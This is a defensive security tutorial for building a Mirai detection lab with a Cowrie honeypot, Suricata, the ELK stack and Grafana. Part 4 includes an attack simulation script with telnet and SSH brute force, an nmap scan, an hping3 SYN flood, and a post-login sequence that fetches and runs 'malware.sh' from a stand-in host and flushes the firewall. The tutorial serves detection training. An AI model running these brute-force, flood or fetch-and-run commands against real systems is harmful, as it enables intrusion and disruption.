# Tutorial 07: Building a Complete Detection Lab

> **Duration:** 120 minutes  
> **Level:** Advanced  
> **Prerequisites:** Tutorials 01-06, System administration skills  
> **Objective:** Build a complete detection environment with IDS, honeypots, and monitoring

---

## 🎯 Learning Objectives

- Deploy complete detection infrastructure
- Configure IDS/IPS with custom rules
- Integrate honeypots with SIEM
- Set up real-time alerting
- Analyze attack patterns
- Generate threat intelligence

---

## Lab Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    Detection Lab Network                     │
│                     (192.168.100.0/24)                       │
│                                                              │
│  ┌──────────────┐      ┌──────────────┐                    │
│  │  Honeypot    │◄────►│   Attacker   │                    │
│  │  (Cowrie)    │      │   Simulation │                    │
│  │  :2222/:2323 │      │              │                    │
│  └──────┬───────┘      └──────────────┘                    │
│         │                                                    │
│         │ Traffic                                           │
│         │                                                    │
│  ┌──────▼────────────────────────────┐                     │
│  │        IDS/IPS (Suricata)         │                     │
│  │     Analyzes all traffic          │                     │
│  │     Applies detection rules       │                     │
│  └──────┬────────────────────────────┘                     │
│         │ Alerts                                            │
│         │                                                    │
│  ┌──────▼────────────────────────────┐                     │
│  │    SIEM (ELK Stack)               │                     │
│  │    - Elasticsearch (storage)       │                     │
│  │    - Logstash (ingestion)          │                     │
│  │    - Kibana (visualization)        │                     │
│  └──────┬────────────────────────────┘                     │
│         │                                                    │
│  ┌──────▼────────────────────────────┐                     │
│  │    Grafana Dashboard              │                     │
│  │    Real-time monitoring           │                     │
│  └───────────────────────────────────┘                     │
└─────────────────────────────────────────────────────────────┘
```

---

## Part 1: Infrastructure Setup (30 minutes)

### Step 1.1: Docker Compose Configuration

Create the detection lab stack:

```yaml
# docker-compose.detection-lab.yml
version: '3.8'

services:
  # Honeypot
  cowrie:
    image: cowrie/cowrie:latest
    container_name: detection_lab_honeypot
    ports:
      - "2222:2222"  # SSH
      - "2323:2323"  # Telnet
    volumes:
      - ./cowrie/var:/cowrie/cowrie-git/var
      - ./cowrie/etc:/cowrie/cowrie-git/etc
    networks:
      - detection_net
    restart: unless-stopped

  # IDS (Suricata)
  suricata:
    image: jasonish/suricata:latest
    container_name: detection_lab_ids
    network_mode: host
    cap_add:
      - NET_ADMIN
      - NET_RAW
    volumes:
      - ./suricata/rules:/etc/suricata/rules
      - ./suricata/logs:/var/log/suricata
      - ./suricata/suricata.yaml:/etc/suricata/suricata.yaml
    command: -i eth0
    restart: unless-stopped

  # Elasticsearch
  elasticsearch:
    image: elasticsearch:8.11.0
    container_name: detection_lab_elasticsearch
    environment:
      - discovery.type=single-node
      - "ES_JAVA_OPTS=-Xms512m -Xmx512m"
      - xpack.security.enabled=false
    ports:
      - "9200:9200"
    volumes:
      - es_data:/usr/share/elasticsearch/data
    networks:
      - detection_net
    restart: unless-stopped

  # Logstash
  logstash:
    image: logstash:8.11.0
    container_name: detection_lab_logstash
    volumes:
      - ./logstash/pipeline:/usr/share/logstash/pipeline
      - ./suricata/logs:/var/log/suricata:ro
      - ./cowrie/var/log:/var/log/cowrie:ro
    ports:
      - "5044:5044"
    environment:
      - "LS_JAVA_OPTS=-Xms256m -Xmx256m"
    networks:
      - detection_net
    depends_on:
      - elasticsearch
    restart: unless-stopped

  # Kibana
  kibana:
    image: kibana:8.11.0
    container_name: detection_lab_kibana
    ports:
      - "5601:5601"
    environment:
      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200
    networks:
      - detection_net
    depends_on:
      - elasticsearch
    restart: unless-stopped

  # Grafana
  grafana:
    image: grafana/grafana:latest
    container_name: detection_lab_grafana
    ports:
      - "3000:3000"
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=admin
    volumes:
      - grafana_data:/var/lib/grafana
      - ./grafana/dashboards:/etc/grafana/provisioning/dashboards
      - ./grafana/datasources:/etc/grafana/provisioning/datasources
    networks:
      - detection_net
    depends_on:
      - elasticsearch
    restart: unless-stopped

networks:
  detection_net:
    driver: bridge

volumes:
  es_data:
  grafana_data:
```

### Step 1.2: Suricata Configuration

Create Suricata rules directory:

```bash
mkdir -p detection-lab/suricata/rules
cp docs/research/network_detection.rules detection-lab/suricata/rules/mirai.rules
```

Configure Suricata:

```yaml
# detection-lab/suricata/suricata.yaml
%YAML 1.1
---

vars:
  address-groups:
    HOME_NET: "[192.168.100.0/24]"
    EXTERNAL_NET: "!$HOME_NET"

default-rule-path: /etc/suricata/rules
rule-files:
  - mirai.rules
  - emerging-threats.rules

outputs:
  - fast:
      enabled: yes
      filename: fast.log
  - eve-log:
      enabled: yes
      filetype: regular
      filename: eve.json
      types:
        - alert
        - http
        - dns
        - tls
        - files
        - ssh

af-packet:
  - interface: eth0
    threads: auto
    cluster-id: 99
    cluster-type: cluster_flow
```

### Step 1.3: Logstash Pipeline

```ruby
# detection-lab/logstash/pipeline/logstash.conf

input {
  # Suricata EVE JSON
  file {
    path => "/var/log/suricata/eve.json"
    codec => "json"
    type => "suricata"
  }
  
  # Cowrie JSON logs
  file {
    path => "/var/log/cowrie/cowrie.json"
    codec => "json"
    type => "cowrie"
  }
}

filter {
  if [type] == "suricata" {
    # Parse Suricata alerts
    if [event_type] == "alert" {
      mutate {
        add_field => { "[@metadata][index]" => "suricata-alerts" }
      }
    }
  }
  
  if [type] == "cowrie" {
    # Parse Cowrie events
    mutate {
      add_field => { "[@metadata][index]" => "cowrie-logs" }
    }
  }
  
  # GeoIP enrichment
  if [src_ip] {
    geoip {
      source => "src_ip"
      target => "geoip"
    }
  }
}

output {
  elasticsearch {
    hosts => ["elasticsearch:9200"]
    index => "%{[@metadata][index]}-%{+YYYY.MM.dd}"
  }
  
  # Debug output
  stdout { codec => rubydebug }
}
```

### Step 1.4: Deploy the Lab

```bash
cd detection-lab
docker-compose -f docker-compose.detection-lab.yml up -d

# Verify all services running
docker-compose ps
```

Expected output:
```
NAME                          STATUS
detection_lab_cowrie          Up
detection_lab_ids             Up
detection_lab_elasticsearch   Up (healthy)
detection_lab_logstash        Up
detection_lab_kibana          Up
detection_lab_grafana         Up
```

---

## Part 2: Detection Rules Deployment (20 minutes)

### Step 2.1: Load Mirai Detection Rules

```bash
# Copy custom Mirai rules
cp docs/research/network_detection.rules \
   detection-lab/suricata/rules/mirai.rules

# Download Emerging Threats rules
cd detection-lab/suricata/rules
curl -O https://rules.emergingthreats.net/open/suricata-6.0/emerging.rules.tar.gz
tar -xzf emerging.rules.tar.gz

# Reload Suricata
docker-compose exec suricata suricatasc -c reload-rules
```

### Step 2.2: Verify Rules Loaded

```bash
# Check rule count
docker-compose exec suricata suricatasc -c "ruleset-stats" | jq .

# View active rules
docker-compose exec suricata grep -r "MIRAI" /etc/suricata/rules/
```

---

## Part 3: Monitoring Dashboard Setup (25 minutes)

### Step 3.1: Configure Kibana

Access Kibana: http://localhost:5601

1. **Create Index Patterns:**
   - Go to Management → Stack Management → Index Patterns
   - Create pattern: `suricata-alerts-*`
   - Create pattern: `cowrie-logs-*`
   - Set time field: `@timestamp`

2. **Import Visualizations:**

```bash
# Import pre-built dashboards
curl -X POST "localhost:5601/api/saved_objects/_import" \
  -H "kbn-xsrf: true" \
  --form file=@observability/kibana/mirai_detection_dashboard.ndjson
```

### Step 3.2: Configure Grafana

Access Grafana: http://localhost:3000 (admin/admin)

1. **Add Elasticsearch Data Source:**
   - Configuration → Data Sources → Add data source
   - Type: Elasticsearch
   - URL: http://elasticsearch:9200
   - Index name: `suricata-alerts-*`
   - Time field: `@timestamp`

2. **Import Detection Dashboard:**

```json
# detection-lab/grafana/dashboards/mirai-detection.json
{
  "dashboard": {
    "title": "Mirai Detection Lab",
    "panels": [
      {
        "title": "Alerts Over Time",
        "type": "graph",
        "targets": [
          {
            "query": "event_type:alert",
            "metrics": [{"type": "count"}]
          }
        ]
      },
      {
        "title": "Top Alert Signatures",
        "type": "table",
        "targets": [
          {
            "query": "event_type:alert",
            "metrics": [{"type": "count"}],
            "bucketAggs": [{"field": "alert.signature", "type": "terms"}]
          }
        ]
      },
      {
        "title": "Attack Source Countries",
        "type": "worldmap",
        "targets": [
          {
            "query": "*",
            "metrics": [{"type": "count"}],
            "bucketAggs": [{"field": "geoip.country_name", "type": "geohash_grid"}]
          }
        ]
      }
    ]
  }
}
```

---

## Part 4: Simulated Attack Testing (30 minutes)

### Step 4.1: Prepare Attack Simulation

**IMPORTANT: Only run in isolated lab!**

```bash
# Create attack simulation script
cat > detection-lab/simulate_attack.sh << 'EOF'
#!/bin/bash
# Simulate Mirai-style attacks (ISOLATED LAB ONLY)

HONEYPOT_IP="192.168.100.10"

echo "[*] Starting attack simulation..."

# 1. Telnet brute force
echo "[1/5] Simulating telnet brute force..."
for cred in "root:root" "admin:admin" "user:pass"; do
    IFS=':' read -r user pass <<< "$cred"
    expect << EXPECT
    spawn telnet $HONEYPOT_IP 2323
    expect "login:"
    send "$user\r"
    expect "Password:"
    send "$pass\r"
    expect eof
EXPECT
    sleep 1
done

# 2. SSH brute force
echo "[2/5] Simulating SSH brute force..."
for pass in "admin" "password" "123456" "default"; do
    sshpass -p "$pass" ssh -p 2222 -o StrictHostKeyChecking=no \
        admin@$HONEYPOT_IP exit 2>/dev/null || true
    sleep 1
done

# 3. Port scan
echo "[3/5] Simulating port scan..."
nmap -sS -T4 -p 1-1000 $HONEYPOT_IP

# 4. SYN flood (low rate)
echo "[4/5] Simulating SYN flood..."
hping3 -S -p 23 --flood --rand-source -c 100 $HONEYPOT_IP

# 5. Malicious commands (via successful login)
echo "[5/5] Simulating malicious commands..."
sshpass -p "root" ssh -p 2222 -o StrictHostKeyChecking=no \
    root@$HONEYPOT_IP << 'SSH'
    wget http://example.com/malware.sh
    chmod +x malware.sh
    ./malware.sh
    kill -9 1234
    /sbin/iptables -F
SSH

echo "[*] Attack simulation complete"
EOF

chmod +x detection-lab/simulate_attack.sh
```

### Step 4.2: Run Attack Simulation

```bash
# Ensure monitoring is active
tail -f detection-lab/suricata/logs/fast.log &

# Run simulation
./detection-lab/simulate_attack.sh
```

### Step 4.3: Observe Detections

Monitor alerts in real-time:

```bash
# Watch Suricata alerts
tail -f detection-lab/suricata/logs/fast.log

# Expected alerts:
# [1:1000001:1] MIRAI Telnet brute force attempt
# [1:1000005:1] MIRAI SSH brute force attempt
# [1:1000010:1] MIRAI Port scanning activity
# [1:1000015:1] MIRAI SYN flood attack
```

---

## Part 5: Threat Analysis (15 minutes)

### Step 5.1: Query Elasticsearch

```bash
# Count total alerts
curl -s "localhost:9200/suricata-alerts-*/_count" | jq .

# Get recent alerts
curl -s "localhost:9200/suricata-alerts-*/_search?size=10&sort=@timestamp:desc" | \
  jq '.hits.hits[]._source | {timestamp, signature: .alert.signature, src_ip}'
```

### Step 5.2: Analyze Honeypot Data

```bash
# Run honeypot analysis
docker-compose exec cowrie python3 /app/analyze_honeypot_logs.py \
  /cowrie/cowrie-git/var/log/cowrie/cowrie.json
```

### Step 5.3: Correlate Events

Create correlation query:

```json
{
  "query": {
    "bool": {
      "must": [
        {"match": {"alert.signature": "MIRAI"}},
        {"range": {"@timestamp": {"gte": "now-1h"}}}
      ]
    }
  },
  "aggs": {
    "by_src_ip": {
      "terms": {"field": "src_ip", "size": 10}
    }
  }
}
```

---

## Part 6: Automated Response (Optional, Advanced)

### Step 6.1: Create Alert Handler

```python
# detection-lab/alert_handler.py
#!/usr/bin/env python3
"""
Automated alert response system
"""

import json
import subprocess
from elasticsearch import Elasticsearch

es = Elasticsearch(['http://localhost:9200'])

def handle_alert(alert):
    """Process security alert"""
    signature = alert['_source']['alert']['signature']
    src_ip = alert['_source']['src_ip']
    
    print(f"[ALERT] {signature} from {src_ip}")
    
    # Automated responses based on severity
    if "SYN flood" in signature:
        block_ip(src_ip, duration=3600)  # Block for 1 hour
    elif "brute force" in signature:
        rate_limit_ip(src_ip)
    elif "malware download" in signature:
        quarantine_sample(alert)

def block_ip(ip, duration):
    """Block IP address"""
    cmd = f"iptables -A INPUT -s {ip} -j DROP"
    subprocess.run(cmd, shell=True)
    print(f"  → Blocked {ip} for {duration}s")

def rate_limit_ip(ip):
    """Rate limit IP"""
    cmd = f"iptables -A INPUT -s {ip} -m limit --limit 5/min -j ACCEPT"
    subprocess.run(cmd, shell=True)
    print(f"  → Rate limited {ip}")

def quarantine_sample(alert):
    """Quarantine malware sample"""
    print(f"  → Sample quarantined")

# Main loop
def main():
    index = "suricata-alerts-*"
    query = {"query": {"match_all": {}}}
    
    for hit in es.search(index=index, body=query, size=1000)['hits']['hits']:
        handle_alert(hit)

if __name__ == '__main__':
    main()
```

---

## 📊 Lab Exercises

### Exercise 1: Custom Rule Creation

Create a rule to detect your specific IoT device:

```
alert tcp any any -> $HOME_NET 8080 (
    msg:"Custom IoT device access";
    content:"User-Agent|3a| IoTDevice/1.0";
    classtype:trojan-activity;
    sid:9000001;
)
```

Test and verify detection.

### Exercise 2: Threat Hunting

Use Kibana to find:
1. Top 5 attack source IPs
2. Most common credentials attempted
3. Peak attack times
4. Geographic distribution of attacks

### Exercise 3: Incident Timeline

Reconstruct attack timeline from logs:
1. Initial scan
2. Credential attempts
3. Successful login
4. Command execution
5. Malware download

---

## ✅ Validation Checklist

- [ ] All services running (6/6 containers up)
- [ ] Suricata detecting attacks (alerts generated)
- [ ] Honeypot capturing interactions
- [ ] Elasticsearch indexing data
- [ ] Kibana visualizations working
- [ ] Grafana dashboards displaying metrics
- [ ] Simulated attacks detected successfully
- [ ] Correlation working between IDS and honeypot
- [ ] GeoIP enrichment functional
- [ ] Automated responses tested (optional)

---

## 🎓 Advanced Topics

- **Machine Learning Detection:** Train ML models on collected data
- **SOAR Integration:** Automate response with Security Orchestration
- **Threat Intelligence Feeds:** Integrate external IoC feeds
- **Distributed Sensors:** Deploy sensors across multiple networks
- **Forensics:** Deep packet inspection and PCAP analysis

---

## 📚 Resources

- [Suricata User Guide](https://suricata.readthedocs.io/)
- [Elastic Stack Documentation](https://www.elastic.co/guide/)
- [Cowrie Documentation](https://github.com/cowrie/cowrie)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)

---

## Next Steps

- [Tutorial 08: Threat Intelligence Generation](08_threat_intelligence.md)
- [Research Paper: Detection Methodology](../../research/METHODOLOGY.md)
- Build your own detection lab
- Contribute detection signatures

**Last Updated:** 2026-02-25
